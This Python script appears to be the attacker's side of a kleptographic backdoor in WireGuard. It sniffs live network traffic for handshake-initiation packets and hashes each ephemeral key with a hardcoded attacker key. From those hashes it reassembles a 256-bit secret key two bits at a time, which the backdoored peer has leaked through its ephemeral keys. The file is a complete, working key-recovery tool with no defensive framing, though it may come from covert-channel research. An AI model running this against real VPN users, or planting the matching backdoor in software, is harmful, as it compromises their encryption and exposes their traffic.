import pyshark
from hashlib import blake2s
import base64

leakLength = 2
attackerKey = 0x1223344556677889

numberOfChunks = int(256/leakLength)
indexMasks = {
    8: 0x1f,
    4: 0x3f,
    2: 0x7f,
    1: 0xff
}
fragmentMask = {
    8: 0xff,
    4: 0x0f,
    2: 0x03,
    1: 0x01
}


def print_current_key(fragments):
    print('Current key: ', end='')
    counter = 0
    current_number = 0
    incomplete = False
    for i in range(numberOfChunks):
        counter += leakLength
        if i in fragments:
            current_number <<= leakLength
            current_number += fragments[i]
        else:
            incomplete = True
        if counter >= 4:
            if counter is 8:
                if incomplete:
                    print('..', end='')
                else:
                    print(format(current_number, '02x'), end='')
            else:
                if incomplete:
                    print('.', end='')
                else:
                    print(format(current_number, '01x'), end='')
            counter = 0
            incomplete = False
            current_number = 0
    print()


attackerKey_bytes = attackerKey.to_bytes(8, 'big')

capture = pyshark.LiveCapture(interface='Ethernet')
# capture.set_debug()

receivedFragments = dict()
key = 0

totalReceivedFragments = 0

for packet in capture.sniff_continuously():
    if 'WG Layer' in str(packet.layers):
        if int(packet['WG'].type) is 1:
            # ephemeral = str(packet['WG'].ephemeral).replace(':', '')
            ephemeral = base64.b64decode(str(packet['WG'].ephemeral))
            h = blake2s(key=attackerKey_bytes, digest_size=2)
            h.update(ephemeral)
            hashedEphemeral = h.digest()
            keyIndex = int(hashedEphemeral[0]) & indexMasks[leakLength]
            totalReceivedFragments += 1
            print(str(totalReceivedFragments) + ': ', end='')
            if keyIndex not in receivedFragments:
                keyFragment = int(hashedEphemeral[1]) & fragmentMask[leakLength]
                key += keyFragment << ((numberOfChunks-keyIndex-1) * leakLength)
                receivedFragments[keyIndex] = keyFragment
                print('Key fragment ' + str(keyIndex) + ' was received (' + hex(keyFragment) + ').')
                # print('Current key: ' + hex(key))
                print_current_key(receivedFragments)
                if len(receivedFragments) is numberOfChunks:
                    break
            else:
                print('Known key fragment ' + str(keyIndex) + ' was received.')

print(hex(key))
print(base64.b64encode(key.to_bytes(32, 'big')))

try:
    capture.clear()
    capture.reset()
    capture.close()
except pyshark.capture.capture.TSharkCrashException as e:
    print('An error occurred when trying to close tshark.')
